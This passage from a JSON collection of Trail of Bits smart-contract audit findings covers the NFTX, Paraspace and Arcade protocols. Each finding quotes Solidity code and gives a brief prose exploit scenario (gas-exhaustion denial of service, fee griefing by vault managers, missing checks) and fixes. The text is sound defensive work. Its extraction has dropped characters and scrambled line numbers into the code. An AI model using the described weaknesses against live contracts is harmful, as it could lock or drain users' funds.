        "body": "When protocol fees are distributed, the system loops through the list of beneciaries (known internally as receivers) to send them the protocol fees they are entitled to. function distribute(uint256 vaultId) external override virtual nonReentrant { require(nftxVaultFactory != address(0)); address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId); uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); if (distributionPaused || allocTotal == 0) { IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance); return; } uint256 length = feeReceivers.length; uint256 leftover; for (uint256 i; i < length; ++i) { FeeReceiver memory _feeReceiver = feeReceivers[i]; uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal); uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); amountToSend = amountToSend > currentTokenBalance ? currentTokenBalance : amountToSend; bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend); if (!complete) { uint256 remaining = IERC20Upgradeable(_vault).allowance(address(this), _feeReceiver.receiver); IERC20Upgradeable(_vault).safeApprove(_feeReceiver.receiver, 0); leftover = remaining; } else { leftover = 0; } } if (leftover != 0) { uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this)); IERC20Upgradeable(_vault).safeTransfer(treasury, currentTokenBalance); } } Figure 7.1: The distribute() function in NFTXSimpleFeeDistributor.sol Because this loop is unbounded and the number of receivers can grow, the amount of gas consumed is also unbounded. function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) { if (_receiver.isContract) { IERC20Upgradeable(_vault).safeIncreaseAllowance(_receiver.receiver, amountToSend); bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend); (bool success, ) = address(_receiver.receiver).call(payload); // If the allowance has not been spent, it means we can pass it forward to next. return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0; } else { IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend); return true; } } Figure 7.2: The _sendForReceiver() function in NFTXSimpleFeeDistributor.sol Additionally, if one of the receivers is a contract, code that signicantly increases the gas cost of the fee distribution will execute (gure 7.2). It is important to note that fees are usually distributed within the context of user transactions (redeeming, minting, etc.), so the total cost of the distribution operation depends on the logic outside of the distribute() function. Exploit Scenario The NFTX team adds a new feature that allows NFTX token holders who stake their tokens to register as receivers and gain a portion of protocol fees; because of that, the number of receivers grows dramatically. Due to the large number of receivers, the distribute() function cannot execute because the cost of executing it has reached the block gas limit. As a result, users are unable to mint, redeem, or swap tokens. Recommendations Short term, examine the execution cost of the function to determine the safe bounds of the loop and, if possible, consider splitting the distribution operation into multiple calls. Long term, consider redesigning the fee distribution mechanism to avoid unbounded loops and prevent denials of service. See appendix D for guidance on redesigning this mechanism.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. A malicious fee receiver can cause a denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "body": "Whenever a user executes a minting, redeeming, or swapping operation on a vault, a fee is charged to the user and is sent to the NFXTSimpleFeeDistributor contract for distribution. The distribution function loops through all fee receivers and sends them the number of tokens they are entitled to (see gure 7.1). If the fee receiver is a contract, a special logic is executed; instead of receiving the corresponding number of tokens, the receiver pulls all the tokens from the NFXTSimpleFeeDistributor contract. function _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) { if (_receiver.isContract) { IERC20Upgradeable(_vault).safeIncreaseAllowance(_receiver.receiver, amountToSend); bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend); (bool success, ) = address(_receiver.receiver).call(payload); // If the allowance has not been spent, it means we can pass it forward to next. return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0; } else { IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend); return true; } } Figure 8.1: The _sendForReceiver() function in NFTXSimpleFeeDistributor.sol In this case, because the receiver contract executes arbitrary logic and receives all of the gas, the receiver contract can spend all of it; as a result, only 1/64 of the original gas forwarded to the receiver contract would remain to continue executing the distribute() function (see EIP-150), which may not be enough to complete the execution, leading to a denial of service. The issue is of high diculty because the addReceiver() function is owner-protected and, as indicated by the NFTX team, the owner is the NFTX DAO. Because the DAO itself was out of scope for this review, we do not know what the process to become a receiver looks like. We assume that a proposal is created and a certain quorum has to be met for it to be executed. Exploit Scenario Eve, a malicious receiver, sets up a smart contract that consumes all the gas forwarded to it when receiveRewards is called. As a result, the distribute() function runs out of gas, causing a denial of service on the vaults calling the function. Recommendations Short term, change the fee distribution mechanism so that only a token transfer is executed even if the receiver is a contract. Long term, consider redesigning the fee distribution mechanism to prevent malicious fee receivers from causing a denial of service on the protocol. See appendix D for guidance on redesigning this mechanism.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Vault managers can grief users ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "body": "The process of creating vaults in the NFTX protocol is trustless. This means that anyone can create a new vault and use any asset as the underlying vault NFT. The user calls the NFTXVaultFactoryUpgradeable contract to create a new vault. After deploying the new vault, the contract sets the user as the vault manager. Vault managers can disable certain vault features (gure 9.1) and change vault fees (gure 9.2). function setVaultFeatures( bool _enableMint, bool _enableRandomRedeem, bool _enableTargetRedeem, bool _enableRandomSwap, bool _enableTargetSwap ) public override virtual { onlyPrivileged(); enableMint = _enableMint; enableRandomRedeem = _enableRandomRedeem; enableTargetRedeem = _enableTargetRedeem; enableRandomSwap = _enableRandomSwap; enableTargetSwap = _enableTargetSwap; emit EnableMintUpdated(_enableMint); emit EnableRandomRedeemUpdated(_enableRandomRedeem); emit EnableTargetRedeemUpdated(_enableTargetRedeem); emit EnableRandomSwapUpdated(_enableRandomSwap); emit EnableTargetSwapUpdated(_enableTargetSwap); } Figure 9.1: The setVaultFeatures() function in NFTXVaultUpgradeable.sol function setFees( uint256 _mintFee, uint256 _randomRedeemFee, uint256 _targetRedeemFee, uint256 _randomSwapFee, uint256 _targetSwapFee ) public override virtual { onlyPrivileged(); vaultFactory.setVaultFees( vaultId, _mintFee, _randomRedeemFee, _targetRedeemFee, _randomSwapFee, _targetSwapFee ); } Figure 9.2: The setFees() function in NFTXVaultUpgradeable.sol The eects of these functions are instantaneous, which means users may not be able to react in time to these changes and exit the vaults. Additionally, disabling vault features with the setVaultFeatures() function can trap tokens in the contract. Ultimately, this risk is related to the trustless nature of vault creation, but the NFTX team can take certain measures to minimize the eects. One such measure, which is already in place, is vault verication, in which the vault manager calls the finalizeVault() function to pass her management rights to the zero address. This function then gives the veried status to the vault in the NFTX web application. Exploit Scenario Eve, a malicious manager, creates a new vault for a popular NFT collection. After it gains some user traction, she unilaterally changes the vault fees to the maximum (0.5 ether), which forces users to either pay the high fee or relinquish their tokens. Recommendations Short term, document the risks of interacting with vaults that have not been nalized (i.e., vaults that have managers). Long term, consider adding delays to manager-only functionality (e.g., a certain number of blocks) so that users have time to react and exit the vault.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Lack of zero address check in functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/NFTX.pdf",
        "body": "Certain setter functions fail to validate incoming arguments, so callers can accidentally set important state variables to the zero address. This issue aects the following contracts and functions:  NFTXInventoryStaking.sol  __NFTXInventoryStaking_init()  NFTXSimpleFeeDistributor.sol  setInventoryStakingAddress()  addReceiver()  changeReceiverAddress()  RewardDistributionToken  __RewardDistributionToken_init() Exploit Scenario Alice deploys a new version of the NFTXInventoryStaking contract. When she initializes the proxy contract, she inputs the zero address as the address of the _nftxVaultFactory state variable, leading to an incorrect initialization. Recommendations Short term, add zero-value checks on all function arguments to ensure that users cannot accidentally set incorrect values, misconguring the system. Long term, use Slither, which will catch functions that do not have zero checks. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Missing negative tests for several assertions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance3.pdf",
        "body": "The Paraspace protocol consists of numerous interacting components, and each operation is validated by checks that are widely dispersed throughout the codebase. Therefore, a robust suite of negative test cases is necessary to prevent vulnerabilities from being introduced if developers unwittingly remove or alter checks during development. However, a number of checks are present in the codebase without corresponding test cases. For example, the health factor check in the FlashClaimLogic contract is required in order to prevent users from extracting collateralized value from NFTs during ash claims, but there is no unit test to ensure this behavior. Commenting out the lines in gure 1.1 does not cause any test to fail. require( 86 87 88 89 ); healthFactor > DataTypes.HEALTH_FACTOR_LIQUIDATION_THRESHOLD, Errors.HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD Figure 1.1: FlashClaimLogic.sol#8689 A test that captures the desired behavior could, for example, initiate a ash claim of a BAYC NFT that is tied to collateralized staked APE (sAPE) and then withdraw the APE directly from the ApeCoinStaking contract, causing the accounts health factor to fall below 1. As another example, removing the following lines from the withdrawApeCoin function in the PoolApeStaking contract demonstrates that no negative test validates this functions logic. require( 73 74 75 76 ); nToken.ownerOf(_nfts[index].tokenId) == msg.sender, Errors.NOT_THE_OWNER Figure 1.2: PoolApeStaking.sol#73 Exploit Scenario Alice, a Paraspace developer, refactors the FlashClaimLogic contract and mistakenly omits the health factor check. Expecting the test suite to catch such errors, she commits the code, and the new version of the Paraspace contracts becomes vulnerable to undercollateralization attacks. Recommendations Short term, for each require statement in the codebase, ensure that at least one unit test fails when the assertion is removed. Long term, consider requiring that Paraspace developers ensure a minimum amount of unit test code coverage when they submit new pull requests to the Paraspace contracts, and that they provide justication for uncovered conditions. 2. Use of a magic constant with unclear meaning for the sAPE unstaking incentive Severity: Informational Diculty: High Type: Conguration Finding ID: TOB-PARASPACE-2 Target: contracts/protocol/tokenization/NTokenApeStaking.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "Arcade has enabled optional compiler optimizations in Solidity. According to a November 2018 audit of the Solidity compiler, the optional optimizations may not be safe. 147 148 149 150 optimizer: { enabled: optimizerEnabled, runs: 200, }, Figure 2.1: The solc optimizer settings in arcade-protocol/hardhat.config.ts High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018; the x for this bug was not reported in the Solidity changelog. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. Another bug due to the incorrect caching of Keccak-256 was reported. It is likely that there are latent bugs related to optimization and that future optimizations will introduce new bugs. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Arcade contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 25 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. callApprove does not follow approval best practices ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The AssetVault.callApprove function has undocumented behaviors and lacks the increase/decrease approval functions, which might impede third-party integrations. A well-known race condition exists in the ERC-20 approval mechanism. The race condition is enabled if a user or smart contract calls approve a second time on a spender that has already been allowed. If the spender sees the transaction containing the call before it has been mined, they can call transferFrom to transfer the previous value and then still receive authorization to transfer the new value. To mitigate this, AssetVault uses the SafeERC20.safeApprove function, which will revert if the allowance is updated from nonzero to nonzero. However, this behavior is not documented, and it might break the protocols integration with third-party contracts or o-chain components. 282 283 284 285 286 287 288 289 290 291 292 293 294 295 37 38 39 40 41 42 function callApprove( address token, address spender, uint256 amount ) external override onlyAllowedCallers onlyWithdrawDisabled nonReentrant { if (!CallWhitelistApprovals(whitelist).isApproved(token, spender)) { revert AV_NonWhitelistedApproval(token, spender); } // Do approval IERC20(token).safeApprove(spender, amount); emit Approve(msg.sender, token, spender, amount); } Figure 3.1: The callApprove function in arcade-protocol/contracts/vault/AssetVault.sol /** * @dev Deprecated. This function has issues similar to the ones found in * {IERC20-approve}, and its usage is discouraged. * * Whenever possible, use {safeIncreaseAllowance} and * {safeDecreaseAllowance} instead. 26 Arcade.xyz V3 Security Assessment */ function safeApprove( IERC20 token, address spender, uint256 value ) internal { 43 44 45 46 47 48 49 50 51 52 53 54 55 56 spender, value)); 57 } // safeApprove should only be called when setting an initial allowance, // or when resetting it to zero. To increase and decrease it, use // 'safeIncreaseAllowance' and 'safeDecreaseAllowance' require( (value == 0) || (token.allowance(address(this), spender) == 0), \"SafeERC20: approve from non-zero to non-zero allowance\" ); _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, Figure 3.2: The safeApprove function in openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol An alternative way to mitigate the ERC-20 race condition is to use the increaseAllowance and decreaseAllowance functions to safely update allowances. These functions are widely used by the ecosystem and allow users to update approvals with less ambiguity. uint256 newAllowance = token.allowance(address(this), spender) + value; _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, } ) internal { function safeIncreaseAllowance( function safeDecreaseAllowance( IERC20 token, address spender, uint256 value 59 60 61 62 63 64 65 spender, newAllowance)); 66 67 68 69 70 71 72 73 74 75 zero\"); 76 77 abi.encodeWithSelector(token.approve.selector, spender, newAllowance)); 78 79 uint256 newAllowance = oldAllowance - value; _callOptionalReturn(token, IERC20 token, address spender, uint256 value ) internal { unchecked { } } uint256 oldAllowance = token.allowance(address(this), spender); require(oldAllowance >= value, \"SafeERC20: decreased allowance below Figure 3.3: The safeIncreaseAllowance and safeDecreaseAllowance functions in openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol 27 Arcade.xyz V3 Security Assessment Exploit Scenario Alice, the owner of an asset vault, sets up an approval of 1,000 for her external contract by calling callApprove. She later decides to update the approval amount to 1,500 and again calls callApprove. This second call reverts, which she did not expect. Recommendations Short term, take one of the following actions:  Update the documentation to make it clear to users and other integrating smart contract developers that two transactions are needed to update allowances.  Add two new functions in the AssetVault contract: callIncreaseAllowance and callDecreaseAllowance, which internally call SafeERC20.safeIncreaseAllowance and SafeERC20.safeDecreaseAllowance, respectively. Long term, when using external libraries/contracts, always ensure that they are being used correctly and that edge cases are explained in the documentation. 28 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Risk of confusing events due to missing checks in whitelist contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The CallWhitelist contracts add and remove functions do not check whether the given call has been registered in the whitelist. As a result, add could be used to register calls that have already been registered, and remove could be used to remove calls that have never been registered; these types of calls would still emit events. For example, invoking remove with a call that is not in the whitelist would emit a CallRemoved event even though no call was removed. Such an event could confuse o-chain monitoring systems, or at least make it more dicult to retrace what happened by looking at the emitted event. 64 65 66 67 function add(address callee, bytes4 selector) external override onlyOwner { whitelist[callee][selector] = true; emit CallAdded(msg.sender, callee, selector); } Figure 4.1: The add function in arcade-protocol/contracts/vault/CallWhitelist.sol 75 76 77 78 function remove(address callee, bytes4 selector) external override onlyOwner { whitelist[callee][selector] = false; emit CallRemoved(msg.sender, callee, selector); } Figure 4.2: The remove function in arcade-protocol/contracts/vault/CallWhitelist.sol A similar problem exists in the CallWhitelistDelegation.setRegistry function. This function can be called to set the registry address to the current registry address. In that case, the emitted RegistryChanged event would be confusing because nothing would have actually changed. 85 86 87 88 89 function setRegistry(address _registry) external onlyOwner { registry = IDelegationRegistry(_registry); emit RegistryChanged(msg.sender, _registry); } 29 Arcade.xyz V3 Security Assessment Figure 4.3: The setRegistry function in arcade-protocol/contracts/vault/CallWhitelistDelegation.sol Arcade has explained that the owner of the whitelist contracts in Arcade V3 will be a (set of) governance contract(s), so it is unlikely that this issue will happen. However, it is possible, and it could be prevented by more validation. Exploit Scenario No calls have yet been added to the whitelist in CallWhitelist. Through the governance system, a proposal to remove a call with the address 0x1 and the selector 0x12345678 is approved. The proposal is executed, and CallWhitelist.remove is called. The transaction succeeds, and a CallRemoved event is emitted, even though the removed call was never in the whitelist in the rst place. Recommendations Short term, add validation to the add, remove, and setRegistry functions. For the add function, it should ensure that the given call is not already in the whitelist. For the remove function, it should ensure that the call is currently in the whitelist. For the setRegistry function, it should ensure that the new registry address is not the current registry address. Adding this validation will prevent confusing events from being emitted and ease the tracing of events in the whitelist over time. Long term, when dealing with function arguments, always ensure that all inputs are validated as tightly as possible and that the subsequent emitted events are meaningful. Additionally, consider setting up an o-chain monitoring system that will track important system events. Such a system will provide an overview of the events that occur in the contracts and will be useful when incidents occur. 30 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Missing checks of _exists() return value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The ERC-721 _exists() function returns a Boolean value that indicates whether a token with the specied tokenId exists. In two instances in Arcades codebase, the function is called but its return value is not checked, bypassing the intended result of the existence check. In particular, in the PromissoryNote.tokenURI() and VaultFactory.tokenURI() functions, _exists() is called before the URI for the tokenId is returned, but its return value is not checked. If the given NFT does not exist, the URI returned by the tokenURI() function will be incorrect, but this error will not be detected due to the missing return value check on _exists(). 165 function tokenURI(uint256 tokenId) public view override(INFTWithDescriptor, ERC721) returns (string memory) { 166 167 168 169 } _exists(tokenId); return descriptor.tokenURI(address(this), tokenId); Figure 5.1: The tokenURI function in arcade-protocol/contracts/PromissoryNote.sol 48 function tokenURI(address, uint256 tokenId) external view override returns (string memory) { 49 return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\"; 50 } Figure 5.2: The tokenURI function in arcade-protocol/contracts/nft/BaseURIDescriptor.sol Exploit Scenario Bob, a developer of a front-end blockchain application that interacts with the Arcade contracts, develops a page that lists users' promissory notes and vaults with their respective URIs. He accidentally passes a nonexistent tokenId to tokenURI(), causing his application to show an incorrect or incomplete URI. 31 Arcade.xyz V3 Security Assessment Recommendations Short term, add a check for the _exists() functions return value to both of the tokenURI() functions to prevent them from returning an incomplete URI for nonexistent tokens. Long term, add new test cases to verify the expected return values of tokenURI() in all contracts that use it, with valid and invalid tokens as arguments. 32 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Incorrect deployers in integration tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The xture deployment function in the provided integration tests uses dierent signers for deploying the Arcade contracts before performing the tests. All Arcade contracts are meant to be deployed by the protocol team, except for vaults, which are deployed by users using the VaultFactory contract. However, in the xture deployment function, some contracts are deployed from the borrower account instead of the admin account. Some examples are shown in gure 6.1; however, there are other instances in which contracts are not deployed from the admin account. const whitelist = <CallWhitelist>await deploy(\"CallWhitelist\", signers[0], const signers: SignerWithAddress[] = await ethers.getSigners(); const [borrower, lender, admin] = signers; 71 72 73 74 []); 75 76 77 signers[0], [BASE_URI]) 78 [vaultTemplate.address, whitelist.address, feeController.address, descriptor.address]); const vaultTemplate = <AssetVault>await deploy(\"AssetVault\", signers[0], []); const feeController = <FeeController>await deploy(\"FeeController\", admin, []); const descriptor = <BaseURIDescriptor>await deploy(\"BaseURIDescriptor\", const vaultFactory = <VaultFactory>await deploy(\"VaultFactory\", signers[0], Figure 6.1: A snippet of the tests in arcade-protocol/test/Integration.ts Exploit Scenario Alice, a developer on the Arcade team, adds a new permissioned feature to the protocol. She adds the relevant integration tests for her feature, and all tests pass. However, because the deployer for the test contracts was not the admin account, those tests should have failed, and the contracts are deployed to the network with a bug. Recommendations Short term, correct all of the instances of incorrect deployers for the contracts in the integration tests le. 33 Arcade.xyz V3 Security Assessment Long term, add additional test cases to ensure that the account permissions in all deployed contracts are correct. 34 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Risk of out-of-gas revert due to use of transfer() in claimFees ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The VaultFactory.claimFees function uses the low-level transfer() operation to move the collected ETH fees to another arbitrary address. The transfer() operation sends only 2,300 units of gas with this operation. As a result, if the recipient is a contract with logic inside the receive() function, which would use extra gas, the operation will probably (depending on the gas cost) fail due to an out-of-gas revert. 194 195 196 197 198 199 function claimFees(address to) external onlyRole(FEE_CLAIMER_ROLE) { uint256 balance = address(this).balance; payable(to).transfer(balance); emit ClaimFees(to, balance); } Figure 7.1: The claimFees function in arcade-protocol/contracts/vault/VaultFactory.sol The Arcade team has explained that the recipient will be a treasury contract with no logic inside the receive() function, meaning the current use of transfer() will not pose any problems. However, if at some point the recipient does contain logic inside the receive() function, then claimFees will likely revert and the contract will not be able to claim the funds. Note, however, that the fees could be claimed by another address (i.e., the fees will not be stuck). The withdrawETH function in the AssetVault contract uses Address.sendValue instead of transfer(). function withdrawETH(address to) external override onlyOwner 223 onlyWithdrawEnabled nonReentrant { 224 225 226 227 228 // perform transfer uint256 balance = address(this).balance; payable(to).sendValue(balance); emit WithdrawETH(msg.sender, to, balance); } 35 Arcade.xyz V3 Security Assessment Figure 7.2: The withdrawETH function in arcade-protocol/contracts/vault/AssetVault.sol Address.sendValue internally uses the call() operation, passing along all of the remaining gas, so this function could be a good candidate to replace use of transfer() in claimFees. However, doing so could introduce other risks like reentrancy attacks. Note that neither the withdrawETH function nor the claimFees function is currently at risk of reentrancy attacks. Exploit Scenario Alice, a developer on the Arcade team, deploys a new treasury contract that contains an updated receive() function that also writes the received ETH amount into a storage array in the treasury contract. Bob, whose account has the FEE_CLAIMER_ROLE role in the VaultFactory contract, calls claimFees with the newly deployed treasury contract as the recipient. The transaction fails because the write to storage exceeds the passed along 2,300 units of gas. Recommendations Short term, consider replacing the claimFees functions use of transfer() with Address.sendValue; weigh the risk of possibly introducing vulnerabilities like reentrancy attacks against the benet of being able to one day add logic in the fee recipients receive() function. If the decision is to have claimFees continue to use transfer(), update the NatSpec comments for the function so that readers will be aware of the 2,300 gas limit on the fee recipient. Long term, when deciding between using the low-level transfer() and call() operations, consider how malicious smart contracts may be able to exploit the lack of limits on the gas available in the recipient function. Additionally, consider the likelihood that the recipient will be a smart wallet or multisig (or other smart contract) with logic inside the receive() function, as the 2,300 gas from transfer() might not be sucient for those recipients. 36 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Risk of lost funds due to lack of zero-address check in functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The VaultFactory.claimFees (gure 8.1), RepaymentController.redeemNote (gure 8.2), LoanCore.withdraw, and LoanCore.withdrawProtocolFees functions are all missing a check to ensure that the to argument does not equal the zero address. As a result, these functions could transfer funds to the zero address. 194 195 196 197 198 199 function claimFees(address to) external onlyRole(FEE_CLAIMER_ROLE) { uint256 balance = address(this).balance; payable(to).transfer(balance); emit ClaimFees(to, balance); } Figure 8.1: The claimFees function in arcade-protocol/contracts/vault/VaultFactory.sol function redeemNote(uint256 loanId, address to) external override { LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); (, uint256 amountOwed) = loanCore.getNoteReceipt(loanId); if (data.state != LoanLibrary.LoanState.Repaid) revert address lender = lenderNote.ownerOf(loanId); if (lender != msg.sender) revert RC_OnlyLender(lender, msg.sender); uint256 redeemFee = (amountOwed * feeController.get(FL_09)) / 126 127 128 129 130 RC_InvalidState(data.state); 131 132 133 134 BASIS_POINTS_DENOMINATOR; 135 136 137 } loanCore.redeemNote(loanId, redeemFee, to); Figure 8.2: The redeemNote function in arcade-protocol/contracts/RepaymentController.sol Exploit Scenario A script that is used to periodically withdraw the protocol fees (calling LoanCore.withdrawProtocolFees) is updated. Due to a mistake, the to argument is left 37 Arcade.xyz V3 Security Assessment uninitialized. The script is executed, and the to argument defaults to the zero address, causing withdrawProtocolFees to transfer the protocol fees to the zero address. Recommendations Short term, add a check to verify that to does not equal the zero address to the following functions:  VaultFactory.claimFees  RepaymentController.redeemNote  LoanCore.withdraw  LoanCore.withdrawProtocolFees Long term, use the Slither static analyzer to catch common issues such as this one. Consider integrating a Slither scan into the projects CI pipeline, pre-commit hooks, or build scripts. 38 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. The maximum value for FL_09 is not set by FeeController ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "The FeeController constructor initializes all of the maximum values for the fees dened in the FeeLookups contract except for FL_09 (LENDER_REDEEM_FEE). Because the maximum value is not set, it is possible to set any amount, with no upper bound, for that particular fee. The lender's redeem fee is used in RepaymentControllers redeemNote function to calculate the fee paid by the lender to the protocol in order to receive their funds back. If the protocol team accidentally sets the fee to 100%, all of the users' funds to be redeemed would instead be used to pay the protocol. 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 constructor() { /// @dev Vault mint fee - gross maxFees[FL_01] = 1 ether; /// @dev Origination fees - bps maxFees[FL_02] = 10_00; maxFees[FL_03] = 10_00; /// @dev Rollover fees - bps maxFees[FL_04] = 20_00; maxFees[FL_05] = 20_00; /// @dev Loan closure fees - bps maxFees[FL_06] = 10_00; maxFees[FL_07] = 50_00; maxFees[FL_08] = 10_00; } Figure 9.1: The constructor in arcade-protocol/contracts/FeeController.sol function redeemNote(uint256 loanId, address to) external override { LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); (, uint256 amountOwed) = loanCore.getNoteReceipt(loanId); 126 127 128 129 130 RC_InvalidState(data.state); 131 if (data.state != LoanLibrary.LoanState.Repaid) revert address lender = lenderNote.ownerOf(loanId); 39 Arcade.xyz V3 Security Assessment if (lender != msg.sender) revert RC_OnlyLender(lender, msg.sender); uint256 redeemFee = (amountOwed * feeController.get(FL_09)) / 132 133 134 BASIS_POINTS_DENOMINATOR; 135 136 137 } loanCore.redeemNote(loanId, redeemFee, to); Figure 9.2: The redeemNote function in arcade-protocol/contracts/RepaymentController.sol Exploit Scenario Charlie, a member of the Arcade protocol team, has access to the privileged account that can change the protocol fees. He wants to set LENDERS_REDEEM_FEE to 5%, but he accidentally types a 0 and sets it to 50%. Users can now lose half of their funds to the new protocol fee, causing distress and lack of trust in the team. Recommendations Short term, set a maximum boundary for the FL_09 fee in FeeControllers constructor. Long term, improve the test suite to ensure that all fee-changing functions test for out-of-bounds values for all fees, not just FL_02. 40 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Fees can be changed while a loan is active ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
        "body": "All fees in the protocol are calculated using the current fees, as informed by the FeeController contract. However, fees can be changed by the team at any time, so the eective rollover and closure fees that the users will pay can change once their loans are already initialized; therefore, these fees are impossible to know in advance. For example, in the code shown in gure 10.1, the LENDER_INTEREST_FEE and LENDER_PRINCIPAL_FEE values are read when a loan is about to be repaid, but these values can be dierent from the values the user agreed to when the loan was initialized. The same can happen in OriginationController and other functions in RepaymentController. function _prepareRepay(uint256 loanId) internal view returns (uint256 LoanLibrary.LoanData memory data = loanCore.getLoan(loanId); if (data.state == LoanLibrary.LoanState.DUMMY_DO_NOT_USE) revert if (data.state != LoanLibrary.LoanState.Active) revert 149 amountFromBorrower, uint256 amountToLender) { 150 151 RC_CannotDereference(loanId); 152 RC_InvalidState(data.state); 153 154 155 156 terms.proratedInterestRate); 157 158 BASIS_POINTS_DENOMINATOR; 159 BASIS_POINTS_DENOMINATOR; 160 161 162 163 } LoanLibrary.LoanTerms memory terms = data.terms; uint256 interest = getInterestAmount(terms.principal, uint256 interestFee = (interest * feeController.get(FL_07)) / uint256 principalFee = (terms.principal * feeController.get(FL_08)) / amountFromBorrower = terms.principal + interest; amountToLender = amountFromBorrower - interestFee - principalFee; Figure 10.1: The _prepareRepay function in arcade-protocol/contracts/RepaymentController.sol 41 Arcade.xyz V3 Security Assessment Exploit Scenario Lucy, the lender, and Bob, the borrower, agree on the current loan conditions and fees at a certain point in time. Some weeks later, when the time comes to repay the loan, they learn that the protocol team decided to change the fees while their loan was active. Lucys earnings are now dierent from what she expected. Recommendations Short term, consider storing (for example, in the LoanTerms structure) the fee values that both counterparties agree on when a loan is initialized, and use those local values for the full lifetime of the loan. Long term, document all of the conditions that are agreed on by the counterparties and that should be constant during the lifetime of the loan, and make sure they are preserved. Add a specic integration or fuzzing test for these conditions. 42 Arcade.xyz V3 Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Asset vault nesting can lead to loss of assets ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-arcade-securityreview.pdf",
